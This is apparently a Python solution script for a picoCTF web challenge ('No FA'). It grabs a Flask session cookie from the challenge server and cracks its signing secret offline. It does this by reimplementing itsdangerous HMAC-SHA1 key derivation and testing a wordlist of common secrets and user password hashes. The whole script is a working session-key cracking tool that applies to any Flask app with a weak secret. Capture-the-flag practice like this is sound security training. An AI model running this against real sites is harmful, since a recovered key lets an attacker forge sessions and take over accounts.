"""Brute-force Flask session secret key for No FA challenge."""
import hashlib
import hmac
import base64
import json
import time
import urllib.request
import urllib.parse
import http.cookiejar

LOGIN_URL = "http://foggy-cliff.picoctf.net:63365/login"
HOME_URL = "http://foggy-cliff.picoctf.net:63365/"

# Get a valid session cookie (manually from response headers)
req = urllib.request.Request(HOME_URL)
try:
    resp = urllib.request.urlopen(req, timeout=5)
except urllib.error.HTTPError as e:
    resp = e
session_cookie = resp.headers.get("Set-Cookie", "")
if session_cookie:
    # Extract just the session=... part
    import re
    m = re.search(r'session=([^;]+)', session_cookie)
    if m:
        session_cookie = m.group(1)
    else:
        session_cookie = None

if not session_cookie:
    print("[!] No session cookie found")
    import sys; sys.exit(1)

print(f"[*] Session cookie: {session_cookie[:80]}...")

# Flask session format: payload.timestamp.signature
parts = session_cookie.split(".")
payload = parts[0]
timestamp = parts[1]
signature = parts[2]

# Add padding
def pad(s):
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return s

# Decode payload
decoded = base64.urlsafe_b64decode(pad(payload))
print(f"[*] Payload: {decoded}")

# Flask uses itsdangerous URLSafeTimedSerializer
# The signing key is derived from the secret_key
# signing = HMAC-SHA1(key, payload + "." + timestamp)
# key = derive_key(secret_key) where derive_key uses HMAC-SHA1

# itsdangerous key derivation:
# 1. key = hmac.new(secret_key, b"cookie-session", sha1).digest()
# 2. signature = hmac.new(key, payload + "." + timestamp, sha1).digest()
# 3. URL-safe base64 of signature

import hmac as hmac_mod

def derive_key(secret):
    """itsdangerous derives the signing key from the secret using HMAC-SHA1."""
    return hmac_mod.new(
        secret.encode() if isinstance(secret, str) else secret,
        b"cookie-session",
        hashlib.sha1
    ).digest()

def verify_session(secret, cookie_val):
    """Check if the secret produces a valid signature for the session cookie."""
    try:
        parts = cookie_val.split(".")
        payload, timestamp, signature = parts
        key = derive_key(secret)
        # Sign the payload
        msg = f"{payload}.{timestamp}".encode()
        expected = hmac_mod.new(key, msg, hashlib.sha1).digest()
        # URL-safe base64
        expected_b64 = base64.urlsafe_b64encode(expected).rstrip(b"=").decode()
        return expected_b64 == signature
    except Exception:
        return False

# Common Flask secrets
secrets = [
    "secret", "secret_key", "password", "admin", "key", "flask", "app",
    "super-secret", "mysecret", "mysecretkey", "secretkey", "flask-secret",
    "dev", "development", "test", "testing", "change-me", "changeme",
    "default", "debug", "picoctf", "pico", "nfa", "no-fa", "no_fa",
    "SECRET_KEY", "FLASK_SECRET_KEY", "MY_SECRET_KEY",
    "your-secret-key", "your_secret_key", "my-secret-key",
    "hard-to-guess", "this-is-a-secret", "supersecretkey",
    "qwerty", "123456", "abc123", "letmein", "welcome",
    "os.urandom(24)", "os.urandom(16)", "os.urandom(32)",
    "s3cr3t", "s3cret", "secr3t", "ThisIsASecret",
    # picoCTF themed
    "picoCTF{", "flag{", "ctf{", "p1c0", "h4ck3r",
    # From the challenge
    "nfs", "iamadmin", "two_fa", "2fa", "bypass",
    # Very common Flask defaults
    "dev key", "development key", "a really really really really long secret key",
    "sk", "sk_", "secret123", "secret1234",
]

print(f"\n[*] Trying {len(secrets)} common Flask secrets...")
found = False
for s in secrets:
    if verify_session(s, session_cookie):
        print(f"[+] SECRET KEY FOUND: '{s}'")
        found = True
        break

if not found:
    print("[-] Not found in common list")
    print("[*] Trying with the admin's SHA-256 hash as secret...")
    # The admin's hash is in the DB - maybe it's used as the secret?
    admin_hash = "c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67"
    if verify_session(admin_hash, session_cookie):
        print(f"[+] SECRET KEY = admin's password hash!")
        found = True

if not found:
    # Try all user passwords hashes as secrets
    print("[*] Trying user password hashes as Flask secret...")
    user_hashes = [
        "599a4410e2af69d1585f16d82d4b5f0abf3ad09fa42b9d55d7b7a50671ccf8c1",  # john.doe
        "81c68634d1b211e0d5632839f7efc8601c743f1ef0c94da8220e26ab221efff1",  # jane.smith
        "c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67",  # admin
    ]
    for h in user_hashes:
        if verify_session(h, session_cookie):
            print(f"[+] SECRET KEY = {h}")
            found = True
            break
